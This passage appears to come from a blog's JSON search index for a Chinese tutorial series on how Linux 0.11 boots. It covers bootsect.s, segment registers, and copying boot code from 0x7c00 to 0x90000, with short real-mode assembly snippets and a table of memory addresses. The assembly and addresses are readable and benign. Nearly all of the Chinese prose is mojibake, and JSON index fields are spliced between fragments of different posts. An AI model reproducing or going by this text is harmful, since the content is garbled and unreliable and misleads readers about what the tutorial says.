æˆ‘ä»¬å°±æ²¡å¿…è¦ç»†ç¢ç£¨äº†ï¼Œå¯¹æ“ä½œç³»ç»Ÿçš„ç†è§£ä½œç”¨ä¸å¤§ï¼Œåªéœ€è¦çŸ¥é“æœ€ç»ˆå­˜å‚¨åœ¨å†…å­˜ä¸­çš„ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Œåœ¨ä»€ä¹ˆä½ç½®ï¼Œå°±å¥½äº†ï¼Œä¹‹åä¼šç”¨åˆ°ä»–ä»¬çš„ã€‚ å†…å­˜åœ°å€ é•¿åº¦(å­—èŠ‚) åç§° 0x90000 2 å…‰æ ‡ä½ç½® 0x90002 2 æ‰©å±•å†…å­˜æ•° 0x90004 2 æ˜¾ç¤ºé¡µé¢ 0x90006 1 æ˜¾ç¤ºæ¨¡å¼ 0x90007 1 å­—ç¬¦åˆ—æ•° 0x90008 2 æœªçŸ¥ 0x9000A 1 æ˜¾ç¤ºå†…å­˜ 0x9000B 1 æ˜¾ç¤ºçŠ¶æ€ 0x9000C 2 æ˜¾å¡ç‰¹æ€§å‚æ•° 0x9000E 1 å±å¹•è¡Œæ•° 0x9000F 1 å±å¹•åˆ—æ•° 0x90080 16 ç¡¬ç›˜1å‚æ•°è¡¨ 0x90090 16 ç¡¬ç›˜2å‚æ•°è¡¨ 0x901FC 2 æ ¹è®¾å¤‡å· ç”±äºä¹‹åå¾ˆå¿«å°±ä¼šç”¨ c è¯­è¨€è¿›è¡Œç¼–ç¨‹ï¼Œè™½ç„¶æ±‡ç¼–å’Œ c è¯­è¨€ä¹Ÿå¯ä»¥ç”¨å˜é‡çš„å½¢å¼è¿›è¡Œä¼ é€’æ•°æ®ï¼Œä½†è¿™éœ€è¦ç¼–è¯‘å™¨åœ¨é“¾æ¥æ—¶åšä¸€äº›é¢å¤–çš„å·¥ä½œï¼Œæ‰€ä»¥è¿™ä¹ˆå¤šæ•°æ®æ›´æ–¹ä¾¿çš„è¿˜æ˜¯åŒæ–¹å…±åŒçº¦å®šä¸€ä¸ªå†…å­˜åœ°å€ï¼Œæˆ‘å¾€è¿™é‡Œå­˜ï¼Œä½ ä»è¿™é‡Œå–ï¼Œå°±å®Œäº‹äº†ã€‚è¿™ææ€•æ˜¯æœ€æœ€åŸå§‹å’Œç›´è§‚çš„å˜é‡ä¼ é€’çš„æ–¹å¼äº†ã€‚ æŠŠè¿™äº›ä¿¡æ¯å­˜å‚¨å¥½ä¹‹åï¼Œæ“ä½œç³»ç»Ÿåˆè¦åšä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ã€‚ cli ; no interrupts allowed ; å°±ä¸€è¡Œ cliï¼Œè¡¨ç¤ºå…³é—­ä¸­æ–­çš„æ„æ€ã€‚ å› ä¸ºåé¢æˆ‘ä»¬è¦æŠŠåŸæœ¬æ˜¯ BIOS å†™å¥½çš„ä¸­æ–­å‘é‡è¡¨ç»™è¦†ç›–æ‰ï¼Œä¹Ÿå°±æ˜¯ç»™ç ´åæ‰äº†ï¼Œå†™ä¸Šæˆ‘ä»¬è‡ªå·±çš„ä¸­æ–­å‘é‡è¡¨ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æ˜¯ä¸å…è®¸ä¸­æ–­è¿›æ¥çš„ã€‚ ç»§ç»­çœ‹ã€‚ ; first we move the system to it's rightful place mov ax,#0x0000 cld ; 'direction'=0, movs moves forward do_move: mov es,ax ; destination segment add ax,#0x1000 cmp ax,#0x9000 jz end_move mov ds,ax ; source segment sub di,di sub si,si mov cx,#0x8000 rep movsw jmp do_move ; then we load the segment descriptors end_move: ... çœ‹åˆ°åé¢é‚£ä¸ª rep movsw ç†Ÿä¸ç†Ÿæ‚‰ï¼Œä¸€å¼€å§‹æˆ‘ä»¬æŠŠæ“ä½œç³»ç»Ÿä»£ç ä» 0x7c00 ç§»åŠ¨åˆ° 0x90000 çš„æ—¶å€™å°±æ˜¯ç”¨çš„è¿™ä¸ªæŒ‡ä»¤ï¼Œæ¥å›¾å›å¿†ä¸€ä¸‹ã€‚ åŒå‰é¢çš„åŸç†ä¸€æ ·ï¼Œä¹Ÿæ˜¯åšäº†ä¸ªå†…å­˜å¤åˆ¶æ“ä½œï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯ï¼ŒæŠŠå†…å­˜åœ°å€ 0x10000 å¤„å¼€å§‹å¾€åä¸€ç›´åˆ° 0x90000 çš„å†…å®¹ï¼Œç»Ÿç»Ÿå¤åˆ¶åˆ°å†…å­˜çš„æœ€å¼€å§‹çš„ 0 ä½ç½®ï¼Œå¤§æ¦‚å°±æ˜¯è¿™ä¹ˆä¸ªæ•ˆæœã€‚ ç”±äºä¹‹å‰çš„å„ç§åŠ è½½å’Œå¤åˆ¶ï¼Œå¯¼è‡´å†…å­˜çœ‹èµ·æ¥å¾ˆä¹±ï¼Œæ˜¯æ—¶å€™è¿›è¡Œä¸€æ³¢å–èˆå’Œæ•´ç†äº†ï¼Œæˆ‘ä»¬é‡æ–°æ¢³ç†ä¸€ä¸‹æ­¤æ—¶çš„å†…å­˜å¸ƒå±€ã€‚ æ ˆé¡¶åœ°å€ä»ç„¶æ˜¯ 0x9FF00 æ²¡æœ‰æ”¹å˜ã€‚ 0x90000 å¼€å§‹å¾€ä¸Šçš„ä½ç½®ï¼ŒåŸæ¥æ˜¯ bootsect å’Œ setup ç¨‹åºçš„ä»£ç ï¼Œç° bootsect çš„ä¸€éƒ¨åˆ†ä»£ç åœ¨å·²ç»è¢«æ“ä½œç³»ç»Ÿä¸ºäº†è®°å½•å†…å­˜ã€ç¡¬ç›˜ã€æ˜¾å¡ç­‰ä¸€äº›ä¸´æ—¶å­˜æ”¾çš„æ•°æ®ç»™è¦†ç›–äº†ä¸€éƒ¨åˆ†ã€‚ å†…å­˜æœ€å¼€å§‹çš„ 0 åˆ° 0x80000 è¿™ 512K è¢« system æ¨¡å—ç»™å ç”¨äº†ï¼Œä¹‹å‰è®²è¿‡ï¼Œè¿™ä¸ª system æ¨¡å—å°±æ˜¯é™¤äº† bootsect å’Œ setup ä¹‹å¤–çš„å…¨éƒ¨ç¨‹åºé“¾æ¥åœ¨ä¸€èµ·çš„ç»“æœï¼Œå¯ä»¥ç†è§£ä¸ºæ“ä½œç³»ç»Ÿçš„å…¨éƒ¨ã€‚ é‚£ä¹ˆç°åœ¨çš„å†…å­˜å¸ƒå±€å°±æ˜¯è¿™ä¸ªæ ·å­ã€‚ å¥½äº†ï¼Œè®°ä½ä¸Šé¢çš„å›¾å°±å¥½äº†ï¼Œè¿™å›æ˜¯ä¸æ˜¯åˆé‡æ–°æ¸…æ™°èµ·æ¥äº†ï¼Ÿä¹‹å‰çš„ä»€ä¹ˆ 0x7c00ï¼Œå·²ç»æ˜¯è¿‡å»å¼äº†ï¼Œèµ¶ç´§å¿˜æ‰å®ƒï¼Œå‘å‰çœ‹ï¼ æ¥ä¸‹æ¥ï¼Œå°±è¦è¿›è¡Œæœ‰ç‚¹æŠ€æœ¯å«é‡çš„å·¥ä½œäº†ï¼Œé‚£å°±æ˜¯æ¨¡å¼çš„è½¬æ¢ï¼Œéœ€è¦ä»ç°åœ¨çš„ 16 ä½çš„å®æ¨¡å¼è½¬å˜ä¸ºä¹‹å 32 ä½çš„ä¿æŠ¤æ¨¡å¼ï¼Œè¿™æ˜¯ä¸€é¡¹å¤§å·¥ç¨‹ï¼ä¹Ÿæ˜¯æˆ‘è®¤ä¸ºçš„è¿™è¶Ÿæ“ä½œç³»ç»Ÿæºç æ—…ç¨‹ä¸­ï¼Œç¬¬ä¸€ä¸ªé¢‡ä¸ºç²¾å½©çš„åœ°æ–¹ï¼Œå¤§å®¶åšå¥½å‡†å¤‡ï¼ åé¢çš„ä¸–ç•Œè¶Šæ¥è¶Šç²¾å½©ï¼Œæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:3:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬ä¸‰å› åšå¥½æœ€æœ€åŸºç¡€çš„å‡†å¤‡å·¥ä½œ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬å››å› æŠŠè‡ªå·±åœ¨ç¡¬ç›˜é‡Œçš„å…¶ä»–éƒ¨åˆ†ä¹Ÿæ”¾åˆ°å†…å­˜æ¥ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬äº”å› è¿›å…¥ä¿æŠ¤æ¨¡å¼å‰çš„æœ€åä¸€æ¬¡æŠ˜è…¾å†…å­˜ ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:4:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬ä¸€ç¯‡","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"Linux-0.11-01 æœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬ä¸€ç¯‡ã€‚ ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"å‰è¨€ ä»è¿™ä¸€ç¯‡å¼€å§‹ï¼Œæ‚¨å°±å°†è·Ÿç€æˆ‘ä¸€èµ·è¿›å…¥è¿™æ“ä½œç³»ç»Ÿçš„æ¢¦å¹»ä¹‹æ—…ï¼ åˆ«æ‹…å¿ƒï¼Œæ¯ä¸€ç« çš„å†…å®¹ä¼šéå¸¸çš„å°‘ï¼Œè€Œä¸”ä½ ä¹Ÿä¸è¦æŠ±ç€å¾ˆå¤§çš„è´Ÿæ‹…å»å­¦ä¹ ï¼Œåªéœ€è¦åƒè¯»å°è¯´ä¸€æ ·ï¼Œè·Ÿç€æˆ‘ä¸€ç« ä¸€ç« è¯»ä¸‹å»å°±å¥½ã€‚ ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"01 æœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç  å½“æŒ‰ä¸‹å¼€æœºé”®çš„é‚£ä¸€åˆ»ï¼Œåœ¨ä¸»æ¿ä¸Šæå‰å†™æ­»çš„å›ºä»¶ç¨‹åº BIOS ä¼šå°†ç¡¬ç›˜ä¸­å¯åŠ¨åŒºçš„ 512 å­—èŠ‚çš„æ•°æ®ï¼ŒåŸå°ä¸åŠ¨å¤åˆ¶åˆ°å†…å­˜ä¸­çš„ 0x7c00 è¿™ä¸ªä½ç½®ï¼Œå¹¶è·³è½¬åˆ°é‚£ä¸ªä½ç½®è¿›è¡Œæ‰§è¡Œã€‚ å¯åŠ¨åŒºçš„å®šä¹‰éå¸¸ç®€å•ï¼Œåªè¦ç¡¬ç›˜ä¸­çš„ 0 ç›˜ 0 é“ 1 æ‰‡åŒºçš„ 512 ä¸ªå­—èŠ‚çš„æœ€åä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«æ˜¯ 0x55 å’Œ 0xaaï¼Œé‚£ä¹ˆ BIOS å°±ä¼šè®¤ä¸ºå®ƒæ˜¯ä¸ªå¯åŠ¨åŒºã€‚ æ‰€ä»¥å¯¹äºæˆ‘ä»¬ç†è§£æ“ä½œç³»ç»Ÿè€Œè¨€ï¼Œæ­¤æ—¶çš„ BIOS ä»…ä»…å°±æ˜¯ä¸ªä»£ç æ¬è¿å·¥ï¼ŒæŠŠ 512 å­—èŠ‚çš„äºŒè¿›åˆ¶æ•°æ®ä»ç¡¬ç›˜æ¬è¿åˆ°äº†å†…å­˜ä¸­è€Œå·²ã€‚æ‰€ä»¥ä½œä¸ºæ“ä½œç³»ç»Ÿçš„å¼€å‘äººå‘˜ï¼Œä»…ä»…éœ€è¦æŠŠæ“ä½œç³»ç»Ÿæœ€å¼€å§‹çš„é‚£æ®µä»£ç ï¼Œç¼–è¯‘å¹¶å­˜å‚¨åœ¨ç¡¬ç›˜çš„ 0 ç›˜ 0 é“ 1 æ‰‡åŒºå³å¯ã€‚ä¹‹å BIOS ä¼šå¸®æˆ‘ä»¬æŠŠå®ƒæ”¾åˆ°å†…å­˜é‡Œï¼Œå¹¶ä¸”è·³è¿‡å»æ‰§è¡Œã€‚ è€Œ Linux-0.11 çš„æœ€å¼€å§‹çš„ä»£ç ï¼Œå°±æ˜¯è¿™ä¸ªç”¨æ±‡ç¼–è¯­è¨€å†™çš„ bootsect.sï¼Œä½äº boot æ–‡ä»¶å¤¹ä¸‹ã€‚ é€šè¿‡ç¼–è¯‘ï¼Œè¿™ä¸ª bootsect.s ä¼šè¢«ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå­˜æ”¾åœ¨å¯åŠ¨åŒºçš„ç¬¬ä¸€æ‰‡åŒºã€‚ éšåå°±ä¼šå¦‚åˆšåˆšæ‰€è¯´ï¼Œç”± BIOS æ¬è¿åˆ°å†…å­˜çš„ 0x7c00 è¿™ä¸ªä½ç½®ï¼Œè€Œ CPU ä¹Ÿä¼šä»è¿™ä¸ªä½ç½®å¼€å§‹ï¼Œä¸æ–­å¾€åä¸€æ¡ä¸€æ¡è¯­å¥æ— è„‘åœ°æ‰§è¡Œä¸‹å»ã€‚ é‚£æˆ‘ä»¬çš„æ¢¦å¹»ä¹‹æ—…ï¼Œå°±ä»è¿™ä¸ªæ–‡ä»¶çš„ç¬¬ä¸€è¡Œä»£ç å¼€å§‹å•¦ï¼ mov ax,0x07c0 mov ds,ax å¥½å§ï¼Œå…ˆè¿ç»­çœ‹ä¸¤è¡Œã€‚ è¿™æ®µä»£ç æ˜¯ç”¨æ±‡ç¼–è¯­è¨€å†™çš„ï¼Œå«ä¹‰æ˜¯æŠŠ 0x07c0 è¿™ä¸ªå€¼å¤åˆ¶åˆ° ax å¯„å­˜å™¨é‡Œï¼Œå†å°† ax å¯„å­˜å™¨é‡Œçš„å€¼å¤åˆ¶åˆ° ds å¯„å­˜å™¨ã€‚é‚£å…¶å®è¿™ä¸€ç•ªæŠ˜è…¾çš„ç»“æœå°±æ˜¯ï¼Œè®© ds è¿™ä¸ªå¯„å­˜å™¨é‡Œçš„å€¼å˜æˆäº† 0x07c0ã€‚ ds æ˜¯ä¸€ä¸ª 16 ä½çš„æ®µå¯„å­˜å™¨ï¼Œå…·ä½“è¡¨ç¤ºæ•°æ®æ®µå¯„å­˜å™¨ï¼Œåœ¨å†…å­˜å¯»å€æ—¶å……å½“æ®µåŸºå€çš„ä½œç”¨ã€‚å•¥æ„æ€å‘¢ï¼Ÿå°±æ˜¯å½“æˆ‘ä»¬ä¹‹åç”¨æ±‡ç¼–è¯­è¨€å†™ä¸€ä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå®é™…ä¸Šä»…ä»…æ˜¯å†™äº†åç§»åœ°å€ï¼Œæ¯”å¦‚ï¼š mov ax, [0x0001] å®é™…ä¸Šç›¸å½“äº mov ax, [ds:0x0001] ds æ˜¯é»˜è®¤åŠ ä¸Šçš„ï¼Œè¡¨ç¤ºåœ¨ ds è¿™ä¸ªæ®µåŸºå€å¤„ï¼Œå¾€åå†åç§» 0x0001 å•ä½ï¼Œå°†è¿™ä¸ªä½ç½®çš„å†…å­˜æ•°æ®ï¼Œå¤åˆ¶åˆ° ax å¯„å­˜å™¨ä¸­ã€‚ å½¢è±¡åœ°æ¯”å–»ä¸€ä¸‹å°±æ˜¯ï¼Œä½ å’Œæœ‹å‹å•†é‡å»å“ªç©æ¯”è¾ƒå¥½ï¼Œä½ è¯´å¤©å®‰é—¨ã€å—é”£é¼“å··ã€é¢å’Œå›­ç­‰ç­‰ï¼Œå®é™…ä¸Šéƒ½æ˜¯åç§»åœ°å€ï¼Œçœç•¥äº†åŒ—äº¬å¸‚è¿™ä¸ªåŸºå€ã€‚ å½“ç„¶ä½ å®Œå…¨å¯ä»¥è¯´åŒ—äº¬å¤©å®‰é—¨ã€åŒ—äº¬å—é”£é¼“å··è¿™æ ·ï¼Œæ¯æ¬¡éƒ½åŠ ä¸ŠåŒ—äº¬è¿™ä¸ªå‰ç¼€ã€‚ä¸è¿‡å¦‚æœä½ äº‹å…ˆå’Œæœ‹å‹è¯´å¥½ï¼Œä»¥ä¸‹æˆ‘è¯´çš„åœ°æ–¹éƒ½æ˜¯åŒ—äº¬å¸‚é‡Œçš„å“ˆï¼Œä¹‹åä½ å°±ä¸ç”¨æ¯æ¬¡éƒ½å¸¦ç€åŒ—äº¬å¸‚è¿™ä¸ªè¯äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Ÿ é‚£ ds è¿™ä¸ªæ•°æ®æ®µå¯„å­˜å™¨çš„ä½œç”¨å°±æ˜¯å¦‚æ­¤ï¼Œæ–¹ä¾¿äº†æè¿°ä¸€ä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå¯ä»¥çœç•¥ä¸€ä¸ªåŸºå€ï¼Œæ²¡ä»€ä¹ˆç¥å¥‡ä¹‹å¤„ã€‚ ds : 0x0001 åŒ—äº¬å¸‚ : å—é”£é¼“å·· å†çœ‹ï¼Œè¿™ä¸ª ds è¢«èµ‹å€¼ä¸ºäº† 0x07c0ï¼Œç”±äº x86 ä¸ºäº†è®©è‡ªå·±åœ¨ 16 ä½è¿™ä¸ªå®æ¨¡å¼ä¸‹èƒ½è®¿é—®åˆ° 20 ä½çš„åœ°å€çº¿è¿™ä¸ªå†å²å› ç´ ï¼ˆä¸äº†è§£è¿™ä¸ªçš„å°±å…ˆåˆ«çº ç»“ä¸ºå•¥äº†ï¼‰ï¼Œæ‰€ä»¥æ®µåŸºå€è¦å…ˆå·¦ç§»å››ä½ã€‚é‚£ 0x07c0 å·¦ç§»å››ä½å°±æ˜¯ 0x7c00ï¼Œé‚£è¿™å°±åˆšå¥½å’Œè¿™æ®µä»£ç è¢« BIOS åŠ è½½åˆ°çš„å†…å­˜åœ°å€ 0x7c00 ä¸€æ ·äº†ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¹‹åå†å†™çš„ä»£ç ï¼Œé‡Œé¢è®¿é—®çš„æ•°æ®çš„å†…å­˜åœ°å€ï¼Œéƒ½å…ˆé»˜è®¤åŠ ä¸Š 0x7c00ï¼Œå†å»å†…å­˜ä¸­å¯»å€ã€‚ ä¸ºå•¥ç»Ÿä¸€åŠ ä¸Š 0x7c00 è¿™ä¸ªæ•°å‘¢ï¼Ÿè¿™å¾ˆå¥½è§£é‡Šï¼ŒBIOS è§„å®šæ­»äº†æŠŠæ“ä½œç³»ç»Ÿä»£ç åŠ è½½åˆ°å†…å­˜ 0x7c00ï¼Œé‚£ä¹ˆé‡Œé¢çš„å„ç§æ•°æ®è‡ªç„¶å°±å…¨éƒ½è¢«åç§»äº†è¿™ä¹ˆå¤šï¼Œæ‰€ä»¥æŠŠæ•°æ®æ®µå¯„å­˜å™¨ ds è®¾ç½®ä¸ºè¿™ä¸ªå€¼ï¼Œæ–¹ä¾¿äº†ä»¥åé€šè¿‡è¿™ç§åŸºå€çš„æ–¹å¼è®¿é—®å†…å­˜é‡Œçš„æ•°æ®ã€‚ OKï¼Œèµ¶ç´§æ¶ˆåŒ–æ‰å‰é¢çš„çŸ¥è¯†ï¼Œé‚£æœ¬ç¯‡å°±åˆ°æ­¤ä¸ºæ­¢ï¼Œåªè®²äº†ä¸¤è¡Œä»£ç ï¼ŒçŸ¥è¯†é‡å¾ˆå°‘ï¼Œæˆ‘æ²¡éª—ä½ å§ã€‚ å¸Œæœ›ä½ èƒ½åšåˆ°ï¼Œå¯¹ BIOS å°†æ“ä½œç³»ç»Ÿä»£ç åŠ è½½åˆ°å†…å­˜ 0x7c00ï¼Œä»¥åŠæˆ‘ä»¬é€šè¿‡ mov æŒ‡ä»¤å°†é»˜è®¤çš„æ•°æ®æ®µå¯„å­˜å™¨ ds å¯„å­˜å™¨çš„å€¼æ”¹ä¸º 0x07c0 æ–¹ä¾¿ä»¥åçš„åŸºå€å¯»å€æ–¹å¼ï¼Œè¿™ä¸¤ä»¶äº‹åœ¨å¿ƒé‡Œè®¤å¯ï¼Œå¹¶ä¸”æ²¡æœ‰ç–‘æƒ‘ï¼Œè¿™æ‰æ–¹ä¾¿åé¢ç»§ç»­è¿›è¡Œã€‚ åé¢çš„ä¸–ç•Œè¶Šæ¥è¶Šç²¾å½©ï¼Œæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ â€”â€”- æœ¬å›æ‰©å±•èµ„æ–™ â€”â€”- æœ‰å…³å¯„å­˜å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ Intel æ‰‹å†Œï¼š Volume 1 Chapter 3.2 OVERVIEW OF THE BASIC EXECUTION ENVIRONMEN æœ‰å…³è®¡ç®—æœºå¯åŠ¨éƒ¨åˆ†çš„åŸç†å¦‚æœè¿˜ä¸æ¸…æ¥šï¼Œå¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« äº†è§£ä¸€ä¸‹ï¼š è®¡ç®—æœºçš„å¯åŠ¨è¿‡ç¨‹ å¦‚æœæƒ³äº†è§£è®¡ç®—æœºå¯åŠ¨æ—¶è¯¦ç»†çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œè¿˜æ˜¯å¾—å‚è€ƒ Intel æ‰‹å†Œï¼š Volume 3A Chapter 9 PROCESSOR MANAGEMENT AND INITIALIZATION ","date":"2021-12-05","objectID":"/2021/12/linux-0.11-01/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-01","uri":"/2021/12/linux-0.11-01/"},{"categories":["LINUX"],"content":"02 è‡ªå·±ç»™è‡ªå·±æŒªä¸ªåœ°å„¿ ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›ä¹¦å’±ä»¬è¯´åˆ°ï¼ŒCPU æ‰§è¡Œæ“ä½œç³»ç»Ÿçš„æœ€å¼€å§‹çš„ä¸¤è¡Œä»£ç ã€‚ mov ax,0x07c0 mov ds,ax å°†æ•°æ®æ®µå¯„å­˜å™¨ ds çš„å€¼å˜æˆäº† 0x07c0ï¼Œæ–¹ä¾¿äº†ä¹‹åè®¿é—®å†…å­˜æ—¶åˆ©ç”¨è¿™ä¸ªæ®µåŸºå€è¿›è¡Œå¯»å€ã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å¸¦ç€è¿™ä¸¤è¡Œä»£ç ï¼Œç»§ç»­å¾€ä¸‹çœ‹å‡ è¡Œã€‚ mov ax,0x07c0 mov ds,ax mov ax,0x9000 mov es,ax mov cx,#256 sub si,si sub di,di rep movw æ­¤æ—¶ ds å¯„å­˜å™¨çš„å€¼å·²ç»æ˜¯ 0x07c0 äº†ï¼Œç„¶ååˆé€šè¿‡åŒæ ·çš„æ–¹å¼å°† es å¯„å­˜å™¨çš„å€¼å˜æˆ 0x9000ï¼Œæ¥ç€åˆæŠŠ cx å¯„å­˜å™¨çš„å€¼å˜æˆ 256ï¼ˆä»£ç é‡Œç¡®å®æ˜¯ç”¨åè¿›åˆ¶è¡¨ç¤ºçš„ï¼Œä¸å…¶ä»–åœ°æ–¹æœ‰äº›ä¸ä¸€è‡´ï¼Œä¸è¿‡æ— æ‰€è°“ï¼‰ã€‚ å†å¾€ä¸‹çœ‹æœ‰ä¸¤ä¸ª sub æŒ‡ä»¤ï¼Œè¿™ä¸ª sub æŒ‡ä»¤å¾ˆç®€å•ï¼Œæ¯”å¦‚ sub a,b å°±è¡¨ç¤º a = a - b é‚£ä¹ˆä»£ç ä¸­çš„ sub si,si å°±è¡¨ç¤º si = si - si æ‰€ä»¥å¦‚æœ sub åé¢çš„ä¸¤ä¸ªå¯„å­˜å™¨ä¸€æ¨¡ä¸€æ ·ï¼Œå°±ç›¸å½“äºæŠŠè¿™ä¸ªå¯„å­˜å™¨é‡Œçš„å€¼æ¸…é›¶ï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºæœ¬ç©æ³•ã€‚ é‚£å°±éå¸¸ç®€å•äº†ï¼Œç»è¿‡è¿™äº›æŒ‡ä»¤åï¼Œä»¥ä¸‹å‡ ä¸ªå¯„å­˜å™¨åˆ†åˆ«è¢«é™„ä¸Šäº†æŒ‡å®šçš„å€¼ï¼Œæˆ‘ä»¬æ¢³ç†ä¸€ä¸‹ã€‚ ds = 0x07c0 es = 0x9000 cx = 256 si = 0 di = 0 è¿˜è®°å¾—ä¸Šä¸€è®²ç”»çš„ CPU å¯„å­˜å™¨çš„æ€»å›¾ä¹ˆï¼Ÿæ­¤æ—¶å°±æ˜¯è¿™æ ·äº† å¹²å˜›è¦ç»™è¿™äº›æ¯«ä¸ç›¸å¹²çš„å¯„å­˜å™¨é™„ä¸Šå€¼å‘¢ï¼Ÿå…¶å®å°±æ˜¯ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤æœåŠ¡çš„ï¼Œå°±æ˜¯ rep movw å…¶ä¸­ rep è¡¨ç¤ºé‡å¤æ‰§è¡Œåé¢çš„æŒ‡ä»¤ã€‚ è€Œåé¢çš„æŒ‡ä»¤ movw è¡¨ç¤ºå¤åˆ¶ä¸€ä¸ªå­—ï¼ˆword 16ä½ï¼‰ï¼Œé‚£å…¶å®å°±æ˜¯ä¸æ–­é‡å¤åœ°å¤åˆ¶ä¸€ä¸ªå­—ã€‚ é‚£ä¸‹é¢è‡ªç„¶å°±æœ‰ä¸‰è¿é—®ï¼š é‡å¤æ‰§è¡Œå¤šå°‘æ¬¡å‘¢æ˜¯ cx å¯„å­˜å™¨ä¸­çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ 256 æ¬¡ã€‚ ä»å“ªå¤åˆ¶åˆ°å“ªå‘¢æ˜¯ä» ds:si å¤„å¤åˆ¶åˆ° es:di å¤„ã€‚ ä¸€æ¬¡å¤åˆ¶å¤šå°‘å‘¢åˆšåˆšè¯´è¿‡äº†ï¼Œå¤åˆ¶ä¸€ä¸ªå­—ï¼Œ16 ä½ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªå­—èŠ‚ã€‚ ä¸Šé¢æ˜¯ç›´è¯‘ï¼Œé‚£æŠŠè¿™æ®µè¯ç¿»è¯‘æˆæ›´äººè¯çš„æ–¹å¼è®²å‡ºæ¥å°±æ˜¯ï¼Œå°†å†…å­˜åœ°å€ 0x7c00 å¤„å¼€å§‹å¾€åçš„ 512 å­—èŠ‚çš„æ•°æ®ï¼ŒåŸå°ä¸åŠ¨å¤åˆ¶åˆ° 0x90000 å¤„ã€‚ å°±æ˜¯ä¸‹å›¾çš„ç¬¬äºŒæ­¥ã€‚ æ²¡é”™ï¼Œå°±æ˜¯è¿™ä¹ˆæŠ˜è…¾äº†ä¸€ä¸‹ã€‚ç°åœ¨ï¼Œæ“ä½œç³»ç»Ÿæœ€å¼€å¤´çš„ä»£ç ï¼Œå·²ç»è¢«æŒªåˆ°äº† 0x90000 è¿™ä¸ªä½ç½®äº†ã€‚ å†å¾€åæ˜¯ä¸€ä¸ªè·³è½¬æŒ‡ä»¤ã€‚ jmpi go,0x9000 go: mov ax,cs mov ds,ax ä»”ç»†æƒ³æƒ³æˆ–è®¸ä½ èƒ½çŒœåˆ°å®ƒæƒ³å¹²å˜›ã€‚ jmpi æ˜¯ä¸€ä¸ªæ®µé—´è·³è½¬æŒ‡ä»¤ï¼Œè¡¨ç¤ºè·³è½¬åˆ° 0x9000:go å¤„æ‰§è¡Œã€‚ è¿˜è®°å¾—ä¸Šä¸€è®²è¯´çš„ æ®µåŸºå€ : åç§»åœ°å€ è¿™ç§æ ¼å¼çš„å†…å­˜åœ°å€è¦å¦‚ä½•è®¡ç®—å§ï¼Ÿæ®µåŸºå€ä»ç„¶è¦å…ˆå·¦ç§»å››ä½ï¼Œå› æ­¤ç»“è®ºå°±æ˜¯è·³è½¬åˆ° 0x90000 + go è¿™ä¸ªå†…å­˜åœ°å€å¤„æ‰§è¡Œã€‚å¿˜è®°çš„èµ¶ç´§å›å»çœ‹çœ‹ï¼Œè¿™æ‰è¿‡äº†ä¸€å›å“¦ï¼Œè¦ç¨³æ‰ç¨³æ‰“ã€‚ å†è¯´ goï¼Œgo å°±æ˜¯ä¸€ä¸ªæ ‡ç­¾ï¼Œæœ€ç»ˆç¼–è¯‘æˆæœºå™¨ç çš„æ—¶å€™ä¼šè¢«ç¿»è¯‘æˆä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼å°±æ˜¯ go è¿™ä¸ªæ ‡ç­¾åœ¨æ–‡ä»¶å†…çš„åç§»åœ°å€ã€‚ è¿™ä¸ªåç§»åœ°å€å†åŠ ä¸Š 0x90000ï¼Œå°±åˆšå¥½æ˜¯ go æ ‡ç­¾åé¢é‚£æ®µä»£ç  mov ax,cs æ­¤æ—¶æ‰€åœ¨çš„å†…å­˜åœ°å€äº†ã€‚ é‚£å‡å¦‚ mov ax,cx è¿™è¡Œä»£ç 